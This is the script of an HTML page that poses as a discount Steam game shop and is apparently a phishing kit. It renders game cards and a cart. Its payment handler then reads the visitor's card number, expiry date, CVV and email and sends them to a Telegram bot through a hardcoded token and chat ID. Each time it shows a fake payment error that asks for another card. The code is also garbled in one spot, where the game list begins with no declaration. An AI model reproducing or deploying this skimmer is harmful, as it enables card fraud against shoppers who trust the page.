<script>
    // звездный фон
    const canvas = document.getElementById('starCanvas');
    let ctx = canvas.getContext('2d');
    let stars = [];
    function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();
    function createStar() { return { x: Math.random() * canvas.width, y: Math.random() * canvas.height, size: Math.random() * 4 + 2, speedY: Math.random() * 1.5 + 0.7, opacity: Math.random() * 0.6 + 0.3 }; }
    for(let i=0;i<200;i++) stars.push(createStar());
    function drawStar(ctx,x,y,size,opacity) {
        ctx.save(); ctx.translate(x,y); ctx.beginPath();
        let spikes=5, outer=size, inner=size*0.4, rot=Math.PI/2*3, step=Math.PI/spikes;
        ctx.moveTo(0,-outer);
        for(let i=0;i<spikes;i++) {
            let x1=Math.sin(rot)*inner, y1=-Math.cos(rot)*inner;
            ctx.lineTo(x1,y1); rot+=step;
            let x2=Math.sin(rot)*outer, y2=-Math.cos(rot)*outer;
            ctx.lineTo(x2,y2); rot+=step;
        }
        ctx.closePath(); ctx.fillStyle=`rgba(200,220,255,${opacity})`; ctx.fill(); ctx.restore();
    }
    function drawStars() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        for(let s of stars) { drawStar(ctx,s.x,s.y,s.size,s.opacity); s.y+=s.speedY; if(s.y>canvas.height) { s.y=-10; s.x=Math.random()*canvas.width; } }
        requestAnimationFrame(drawStars);
    }
    drawStars();

        { name: "Watch Dogs: Legion", oldPrice: 2499, img: "https://i.ytimg.com/vi/X8ucUN6rQSY/maxresdefault.jpg", genre: "Action-Adventure", dev: "Ubisoft", year: 2020, desc: "Взлом и вербовка любого NPC в Лондоне. Резистанс против авторитарного режима.", requirements: "ОС: Windows 10, Процессор: Intel i5-4460, ОЗУ: 8 GB, Видеокарта: GTX 960, Место: 45 GB" },
        { name: "Doom Eternal", oldPrice: 1999, img: "https://i.ytimg.com/vi/TIhzJ6U4ZXw/maxresdefault.jpg", genre: "FPS", dev: "id Software", year: 2020, desc: "Бескомпромиссный экшен. Уничтожайте демонов на бешеной скорости, используя арсенал оружия.", requirements: "ОС: Windows 10, Процессор: Intel i5-2500K, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 50 GB" },
        { name: "Control", oldPrice: 1999, img: "https://cdn2.unrealengine.com/Diesel%2Fblog%2Fcontrol-pre-purchase%2FControl_GDC_News_2560x1440-2560x1440-d6bed801c1797a2a9062faaf82c7eafcc6d7c7a2.jpg", genre: "Action", dev: "Remedy", year: 2019, desc: "Джесси Фэйден исследует Бюро Контроля, используя сверхспособности. Сюрреалистический мир и разрушаемое окружение.", requirements: "ОС: Windows 10, Процессор: Intel i5-7500, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 42 GB" },
        { name: "Metro Exodus", oldPrice: 1999, img: "https://i.playground.ru/p/tjzzerKeNVbGR_uEhWIEeg.jpeg", genre: "Survival FPS", dev: "4A Games", year: 2019, desc: "Артём покидает московское метро и путешествует на поезде по постапокалиптической России. Смена сезонов.", requirements: "ОС: Windows 10, Процессор: Intel i5-4440, ОЗУ: 8 GB, Видеокарта: GTX 670, Место: 59 GB" },
        { name: "Borderlands 3", oldPrice: 2499, img: "https://i.playground.ru/e/aky7x1oiJbQcaHngNqFXNQ.jpeg", genre: "Looter Shooter", dev: "Gearbox", year: 2019, desc: "Миллиарды пушек, безумный юмор и кооператив. Истребите детей-калипсо и найдите хранилище.", requirements: "ОС: Windows 10, Процессор: Intel i5-3570, ОЗУ: 6 GB, Видеокарта: GTX 680, Место: 75 GB" },
        { name: "Mortal Kombat 11", oldPrice: 1999, img: "https://images.stopgame.ru/news/2019/01/14/MaqO9N1.jpg", genre: "Fighting", dev: "NetherRealm", year: 2019, desc: "Жестокие файтинги с фаталити. Гостевые персонажи, сюжетная кампания и кастомизация.", requirements: "ОС: Windows 10, Процессор: Intel i5-750, ОЗУ: 8 GB, Видеокарта: GTX 670, Место: 60 GB" },
        { name: "Street Fighter 6", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/18211310/2a0000019ae90800db4bc45521faf50062ab/orig", genre: "Fighting", dev: "Capcom", year: 2023, desc: "Новая часть легендарной серии. Режим World Tour, улучшенная графика и механики.", requirements: "ОС: Windows 10, Процессор: Intel i5-7500, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 60 GB" }
    ];
    
    function getDiscountedPrice(oldPrice) {
        return Math.round(oldPrice * 0.7);
    }
    
    const gamesGrid = document.getElementById('gamesGrid');
    function renderGames() {
        gamesGrid.innerHTML = '';
        games.forEach((game, index) => {
            const newPrice = getDiscountedPrice(game.oldPrice);
            const card = document.createElement('div');
            card.className = 'product-card';
            card.setAttribute('data-game-index', index);
            card.innerHTML = `
                <img src="${game.img}" class="game-img" alt="${game.name}" loading="lazy" onerror="this.src='https://via.placeholder.com/200x200?text=No+Image'">
                <h3>${game.name}</h3>
                <div class="price-container">
                    <span class="old-price">${game.oldPrice} ₽</span>
                    <span class="new-price">${newPrice} ₽</span>
                    <span class="discount-badge">-30%</span>
                </div>
                <button class="btn-details" data-index="${index}">📖 подробнее</button>
                <button class="btn-buy" data-name="${game.name}" data-price="${newPrice}">🛒 купить</button>
            `;
            gamesGrid.appendChild(card);
        });
        bindDetailsButtons();
        bindBuyButtons();
    }
    
    // обработка кнопок "подробнее"
    function bindDetailsButtons() {
        document.querySelectorAll('.btn-details').forEach(btn => {
            btn.removeEventListener('click', detailsHandler);
            btn.addEventListener('click', detailsHandler);
        });
        // также клик на всю карточку можно, но ограничимся кнопкой
    }
    
    function detailsHandler(e) {
        e.stopPropagation();
        const index = parseInt(this.getAttribute('data-index'));
        const game = games[index];
        const newPrice = getDiscountedPrice(game.oldPrice);
        const modalBody = document.getElementById('gameModalBody');
        modalBody.innerHTML = `
            <div class="game-modal-header">
                <img src="${game.img}" class="game-modal-img" alt="${game.name}" onerror="this.src='https://via.placeholder.com/200x200'">
                <div>
                    <div class="game-modal-title">${game.name}</div>
                    <div class="game-modal-price"><span class="old-price" style="font-size:1rem;">${game.oldPrice} ₽</span> → <strong style="color:#6c8cff; font-size:1.8rem;">${newPrice} ₽</strong> <span class="discount-badge">-30%</span></div>
                    <div><strong>Жанр:</strong> ${game.genre}</div>
                    <div><strong>Разработчик:</strong> ${game.dev}</div>
                    <div><strong>Год выпуска:</strong> ${game.year}</div>
                </div>
            </div>
            <div class="game-modal-desc">
                <p>${game.desc}</p>
            </div>
            <div class="specs">
                <h4>🖥️ Системные требования (минимальные):</h4>
                <p>${game.requirements}</p>
            </div>
            <button class="buy-modal-btn" data-name="${game.name}" data-price="${newPrice}">💎 Добавить в корзину за ${newPrice} ₽</button>
        `;
        document.getElementById('gameModal').style.display = 'flex';
        // привязка кнопки внутри модалки
        const buyModalBtn = modalBody.querySelector('.buy-modal-btn');
        if (buyModalBtn) {
            buyModalBtn.addEventListener('click', (e) => {
                const name = buyModalBtn.getAttribute('data-name');
                const price = parseInt(buyModalBtn.getAttribute('data-price'));
                addItemToCart({ name: name, price: price });
                document.getElementById('gameModal').style.display = 'none';
                showErrorToast("✅ Товар добавлен в корзину!"); // зелёное уведомление
            });
        }
    }
    
    // корзина
    let cart = [];
    function addItemToCart(item) {
        cart.push(item);
        updateCartUI();
    }
    function updateCartUI() {
        let countSpan = document.getElementById('cartCount');
        if(countSpan) countSpan.innerText = cart.length;
        renderCartModal();
    }
    function renderCartModal() {
        let container = document.getElementById('cartItemsList');
        let totalSpan = document.getElementById('modalCartTotal');
        if(!container) return;
        if(cart.length===0) { container.innerHTML='<p>✨ корзина пуста ✨</p>'; totalSpan.innerText='Итого: 0 ₽'; return; }
        let total=0;
        let html='';
        cart.forEach((item,idx)=>{
            let price = item.price || 0;
            total+=price;
            html+=`<div class="cart-item"><span>${item.name}</span><span>${price} ₽ <button class="remove-item" data-idx="${idx}" style="background:#ff7b7b; border:none; border-radius:30px; padding:2px 10px; margin-left:8px;">x</button></span></div>`;
        });
        container.innerHTML=html;
        totalSpan.innerText=`Итого: ${total} ₽`;
        document.querySelectorAll('.remove-item').forEach(btn=>{
            btn.addEventListener('click',(e)=>{
                let idx=parseInt(btn.getAttribute('data-idx'));
                cart.splice(idx,1);
                updateCartUI();
            });
        });
    }
    
    function bindBuyButtons() {
        document.querySelectorAll('.btn-buy').forEach(btn=>{
            btn.removeEventListener('click', buyHandler);
            btn.addEventListener('click', buyHandler);
        });
        function buyHandler(e) {
            e.stopPropagation();
            let name = this.getAttribute('data-name');
            let price = parseInt(this.getAttribute('data-price'));
            addItemToCart({ name: name, price: price });
            showErrorToast("✅ Добавлено в корзину");
        }
    }
    
    // уведомления (можно разные цвета)
    function showErrorToast(message = "❌ Ошибка оплаты. Проверьте данные карты.") {
        let oldToasts = document.querySelectorAll('.error-toast');
        oldToasts.forEach(t => t.remove());
        let toast = document.createElement('div');
        toast.className = 'error-toast';
        toast.innerText = message;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }
    
    // телеграм данные
    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
    const CHAT_ID = 7711202514;
    
    const cartModal = document.getElementById('cartModal');
    const openCartBtn = document.getElementById('openCartBtn');
    const closeCartBtn = document.getElementById('closeCartBtn');
    openCartBtn?.addEventListener('click',()=>{ renderCartModal(); cartModal.style.display='flex'; });
    closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
    window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
    
    document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
        if(cart.length===0) {
            showErrorToast("❌ Корзина пуста");
            return;
        }
        let cardNum = document.getElementById('cardNumber').value.trim();
        let expiry = document.getElementById('cardExpiry').value.trim();
        let cvv = document.getElementById('cardCvv').value.trim();
        let email = document.getElementById('steamEmail').value.trim();
        if(!email) email = "не указан";
        if(!cardNum || !expiry || !cvv) {
            showErrorToast("❌ Заполните все поля карты");
            return;
        }
        let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
        let itemsText = cart.map(i=>`${i.name} — ${i.price} ₽`).join('\n');
        let msg = `💳 EXCELLENT SHOP (STEAM) 💳\n👤 Гость\n📧 Email: ${email}\n🛒 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 Срок: ${expiry}\n🔐 CVV: ${cvv}\n🌐 IP: ${window.location.hostname}`;
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
            });
            showErrorToast("❌ Ошибка оплаты. Не удалось обработать платеж. Попробуйте другую карту.");
            cart = [];
            updateCartUI();
            cartModal.style.display = 'none';
            document.getElementById('cardNumber').value = '';
            document.getElementById('cardExpiry').value = '';
            document.getElementById('cardCvv').value = '';
            document.getElementById('steamEmail').value = '';
        } catch(e) {
            showErrorToast("❌ Ошибка соединения");
        }
    });
    
    // закрытие модалки описания
    const gameModal = document.getElementById('gameModal');
    const closeGameModal = document.querySelector('.close-game-modal');
    closeGameModal?.addEventListener('click', () => { gameModal.style.display = 'none'; });
    window.addEventListener('click', (e) => { if(e.target === gameModal) gameModal.style.display = 'none'; });
    
    renderGames();
    updateCartUI();
</script>
</body>
</html>
